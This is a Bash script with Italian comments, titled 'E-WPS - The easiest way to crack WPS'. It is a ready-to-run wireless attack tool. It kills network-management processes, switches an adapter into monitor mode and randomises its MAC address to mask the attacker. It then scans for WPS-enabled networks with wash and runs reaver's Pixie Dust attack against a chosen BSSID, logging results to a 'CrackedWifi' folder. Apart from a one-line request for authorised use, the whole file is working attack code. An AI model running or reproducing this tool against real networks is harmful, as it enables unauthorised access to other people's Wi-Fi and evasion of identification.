#!/bin/bash

#    E-WPS - The easiest way to crack WPS
#    Copyright (C) 2015-2016
#    Script by Leprechaun
#    Author: https://github.com/Leproide
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#    E-Mail: leproide@paranoici.org
#    PGP: https://pgp.mit.edu/pks/lookup?op=get&search=0x8FF24099181CE01E
#
#    NOTE: usare solo su reti di propria proprietà o con autorizzazione esplicita.

# -------------------------------------------------------------------------------

# Colori (helper per ridurre ripetizione tput)
c_red()   { tput setaf 1; tput bold; }
c_green() { tput setaf 2; tput bold; }
c_blue()  { tput setaf 4; tput bold; }
c_yellow(){ tput setaf 3; tput bold; }
c_white() { tput setaf 7; tput bold; }
c_reset() { tput sgr0; }

# Errore fatale: stampa messaggio rosso ed esce
die() { c_red; echo -e "\n$1" >&2; c_reset; exit 1; }

# Controllo root (bug originale: virgolette tipografiche non ASCII)
if [ "$(id -u)" != "0" ]; then
    die "Questo script va avviato come root\n"
fi

# Controllo dipendenze: iw e ip sono i sostituti moderni di iwconfig/ifconfig
for tool in iw ip wash reaver; do
    command -v "$tool" >/dev/null 2>&1 || die "Dipendenza mancante: $tool"
done
# macchanger è opzionale; se assente si usa fallback con ip
HAS_MACCHANGER=0
command -v macchanger >/dev/null 2>&1 && HAS_MACCHANGER=1
# airmon-ng è opzionale; serve per killare i processi che bloccano il monitor
HAS_AIRMON=0
command -v airmon-ng >/dev/null 2>&1 && HAS_AIRMON=1

# Restituisce il MAC corrente dell'interfaccia (fallback se manca macchanger)
current_mac() {
    ip link show "$1" 2>/dev/null | awk '/link\/ether/{print $2; exit}'
}

# Killa i processi che interferiscono col monitor (NetworkManager, wpa_supplicant...)
# Richiede airmon-ng; opzionale, va confermato dall'utente.
kill_interfering() {
    [ "$HAS_AIRMON" -ne 1 ] && { c_red; echo "airmon-ng non installato, salto..."; return; }
    c_blue
    echo -e "\nVuoi terminare i processi che interferiscono col monitor mode?"
    echo "(NetworkManager/wpa_supplicant verranno fermati) [s/N]"
    c_white
    read -r kill_ans
    case $kill_ans in
        s|S)
            c_green; echo "Eseguo: airmon-ng check kill..."
            airmon-ng check kill >/dev/null 2>&1
            sleep 1
            ;;
        *) c_green; echo "Salto..." ;;
    esac
}

# Imposta la modalità monitor tramite iw (down -> type monitor -> [random MAC] -> up)
# $2 = "mac" per randomizzare anche il MAC (richiede macchanger)
set_monitor() {
    local dev="$1" do_mac="$2"
    c_green; echo "Interfaccia down..."
    ip link set "$dev" down || die "Errore: non riesco a disattivare l'adattatore di rete"
    sleep 1
    echo "Imposto modalità monitor (iw)..."
    iw dev "$dev" set type monitor || die "Errore: non riesco ad inizializzare la modalità monitor"
    sleep 1
    if [ "$do_mac" = "mac" ]; then
        if [ "$HAS_MACCHANGER" -eq 1 ]; then
            c_white; echo "Random MAC..."
            macchanger -r "$dev" || die "Errore: non riesco a impostare un MAC casuale"
            sleep 1
        else
            c_red; echo "macchanger non installato, salto il cambio MAC..."
        fi
    fi
    c_green; echo "Interfaccia up..."
    ip link set "$dev" up || die "Errore: non riesco a riattivare l'adattatore di rete"
    sleep 1
}

# Cambia solo il MAC su interfaccia già in monitor (richiede macchanger)
random_mac() {
    local dev="$1"
    if [ "$HAS_MACCHANGER" -ne 1 ]; then
        c_red; echo "macchanger non installato, salto il cambio MAC..."
        return
    fi
    c_green; echo "Interfaccia down..."
    ip link set "$dev" down || die "Errore: non riesco a disattivare l'adattatore di rete"
    sleep 1
    echo "Random MAC..."
    c_white
    macchanger -r "$dev" || die "Errore: non riesco a impostare un MAC casuale"
    sleep 1
    c_green; echo "Interfaccia up..."
    ip link set "$dev" up || die "Errore: non riesco a riattivare l'adattatore di rete"
    sleep 1
}

# Pulisco il terminale e mostro il logo
clear
c_yellow
echo ' ___________          __      ____________  _________'
echo ' \_   _____/         /  \    /  \         \/   _____/'
echo '  |    __)_   ______ \   \/\/   /|     ___/\_____  \'
echo '  |        \ /_____/  \        / |    |    /        \'
echo ' /_______  /           \__/\  /  |____|   /_______  /'
echo '         \/                 \/                    \/'
c_red
echo -e "\n			The easiest way to crack WPS"

# Inizio script: elenco adattatori WiFi tramite iw (sostituisce ifconfig|grep wl)
c_blue
echo -e "\n\nVisualizzo gli adattatori di rete WiFi..."
c_white
iw dev | awk '$1=="Interface"{print " - "$2}'
c_blue
echo -e "\nQuale wlan vuoi utilizzare? (default wlan0)"
c_white
read -r wadapter
[ -z "$wadapter" ] && wadapter=wlan0

# Verifico che l'interfaccia esista
iw dev "$wadapter" info >/dev/null 2>&1 || die "Errore: interfaccia $wadapter non trovata"
clear

# Controllo che non sia già in modalità monitor (iw al posto di iwconfig)
if iw dev "$wadapter" info 2>/dev/null | grep -q "type monitor"; then
    # Già in monitor: chiedo se cambiare MAC
    c_green
    echo -e "\nL'adattatore è già in modalità monitor, vuoi cambiare MAC?"
    echo -e "\nc+enter per cambiare - enter per continuare con il MAC attuale"
    c_white
    read -r cambiomac
    case $cambiomac in
        c) random_mac "$wadapter" ;;
        *) clear; c_green; echo -e "\nContinuiamo..." ;;
    esac
    sleep 1
else
    # Non in monitor: opzionale kill processi interferenti, poi monitor + random MAC
    kill_interfering
    set_monitor "$wadapter" mac
fi

# Visualizzo le impostazioni correnti
clear
c_blue
echo -e "\nVisualizzo le impostazioni correnti:"
c_white
echo "Current MAC: $(current_mac "$wadapter")"
echo "--------------------"
iw dev "$wadapter" info | grep -E "type"
c_blue
echo -e "\n~Terminato~"
sleep 1

# Cartella di lavoro
if [ -d "CrackedWifi" ]; then
    c_green; echo -e "\nCartella di lavoro presente, proseguo..."
else
    c_red; echo -e "\nCreo la cartella di lavoro..."
    mkdir "CrackedWifi"
fi

# Trap Ctrl-C (impostata una sola volta)
int_trap() { c_blue; echo -e "\nCtrl-C premuto"; }
trap int_trap INT

# Ciclo di scansione/attacco
while true; do

    # Avvio Wash per elencare le reti WPS visibili
    c_white
    wash -i "$wadapter"

    # Parametri per reaver, con validazione
    c_red; echo -e "\nMAC da attaccare (exit per uscire):"
    c_white; read -r bssid
    # Uscita rapida dal prompt del MAC
    if [ "$bssid" = "exit" ]; then
        c_reset; exit 0
    fi
    if ! echo "$bssid" | grep -qiE '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'; then
        c_red; echo "BSSID non valido, riprova..."; sleep 1; clear; continue
    fi

    c_red; echo "Canale:"
    c_white; read -r chn
    if ! echo "$chn" | grep -qE '^[0-9]+$'; then
        c_red; echo "Canale non valido, riprova..."; sleep 1; clear; continue
    fi
    clear

    # Evito di riattaccare una rete già crackata
    if [ -f "CrackedWifi/${bssid}" ]; then
        c_red
        echo -e "\nEsiste già un file legato a questa rete nella directory di lavoro..."
    else
        # Avvio reaver
        if reaver -i "$wadapter" -b "$bssid" -c "$chn" -K 1 -vv | tee "CrackedWifi/${bssid}"; then
            echo "Cracking completo"
        else
            echo "Qualcosa è andato storto..."
            rm -f "CrackedWifi/${bssid}"
        fi
    fi

    # Uscita/continua (ovvia la trap)
    c_blue; echo -e "\nenter per continuare - e+enter per uscire"
    c_white; read -r scelta
    case $scelta in
        e) c_reset; exit 0 ;;
        *) clear; c_green; echo -e "\nContinuiamo..." ;;
    esac

done
